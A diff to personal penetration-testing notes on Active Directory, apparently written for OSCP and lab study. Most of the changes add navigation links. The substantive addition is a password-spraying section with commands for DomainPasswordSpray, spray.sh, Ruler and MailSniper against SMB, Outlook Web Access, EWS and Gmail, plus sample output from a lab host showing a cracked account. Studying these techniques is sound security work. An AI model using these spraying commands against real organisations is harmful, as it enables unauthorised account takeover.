@@ -1,5 +1,15 @@
 # Pentesting Active Directory
 
+
+### Cheatsheat
+
+[John Woodman's site](https://wadcoms.github.io/)
+
+Modeled after GTFOBINs and LOLBAS but for attacking active directory.
+
+### INDEX
+
+
 [Basic Overview](#basic-overview)
 
 [Recon](#recon-ad)
@@ -9,15 +19,9 @@
 [Enumerating AD WITH creds](#enumerating-ad-with-creds)
 
 
-### Cheatsheat
-
-[John Woodman's site](https://wadcoms.github.io/)
-
-Modeled after GTFOBINs and LOLBAS but for attacking active directory.
-
-
-
 # Basic Overview
+[back to top](#index)
+
 
 A administrative tool made by Microsoft, used to create and manage domains, users, and objects within a network. This allows for different privileges and access that scales even with very large numbers of users, computers, domains, ect..
 
@@ -50,6 +54,7 @@ Active Directory provides several different services, which fall under the umbre
 AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. 
 
 # Recon AD
+[back to top](#index)
 
 ## With No Creds or Sessions
 
@@ -132,6 +137,7 @@ ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberO
 - If you find the complete names of company workers, you could try different AD username conventions
 
 ## Enumerating AD users without having Creds or Session
+[back to top](#index)
 
 You can use Kerberos (the AD gatekeeper) to see if a user exitist
 
@@ -227,6 +233,8 @@ if __name__ == '__main__':
 ```
 
 ### Okay we have a valid username, how to get the password:
+[back to top](#index)
+
 
 #### ASREPRoast
 
@@ -326,14 +334,60 @@ Rubeus:
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
 
-Some manual Scripts to try
+Some manual Scripts to try (best not to try more than 5/7 per account)
 
-[DomainPasswordSpray.ps1]() from dafthack
+[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) from dafthack
 
+```ps
+Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
+```
+
+[spray.sh](https://github.com/Greenwolf/Spray) from Greenwolf
+
+```bash
+spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
+```
+
+##### Outlook Web Access
+
+DomainPasswordSpray.ps1 can do this, as well as msf Owa_login and Owa_ews_login modules. The following two are also valid:
+
+Ruler (haven't used by hacktricks says it is reliable)
+```bash
+$ ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
+    [x] Failed: larsson:Summer2020
+    [x] Failed: cube0x0:Summer2020
+    [x] Failed: a.admin:Summer2020
+    [x] Failed: c.cube:Summer2020
+    [+] Success: s.svensson:Summer2020
+    [x] Failed: s.sven:Summer2020
+    [x] Failed: j.jenny:Summer2020
+    [x] Failed: t.teresa:Summer2020
+    [x] Failed: t.trump:Summer2020
+    [x] Failed: a.adams:Summer2020
+    [x] Failed: l.larsson:Summer2020
+    [x] Failed: CUBE0X0:Summer2020
+    [x] Failed: A.ADMIN:Summer2020
+    [x] Failed: C.CUBE:Summer2020
+    [+] Success: S.SVENSSON:Summer2020
+```
+
+With [MailSniper.ps1](https://github.com/dafthack/MailSniper) also by dafthack
+```ps
+#Invoke-PasswordSprayOWA will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
+Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
+
+#Invoke-PasswordSprayEWS will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.
+Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
+
+# GMAIL
+Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
+```
 
 
 
 # Enumerating AD WITH creds
+[back to top](#index)
 
 Having compromised an account is a big step to start compromising the whole domain, because you are going to be able to start the Active Directory Enumeration:
 
@@ -341,6 +395,8 @@ Having compromised an account is a big step to start compromising the whole doma
 
 
 # Attacking AD
+[back to top](#index)
+
 
 ## Cached Creds
 
@@ -474,6 +530,8 @@ notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)
 
 
 Ten attacks you should master for the OSCP:
+
+[back to top](#index)
 
 10. ReadGMSAPassword 
 Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
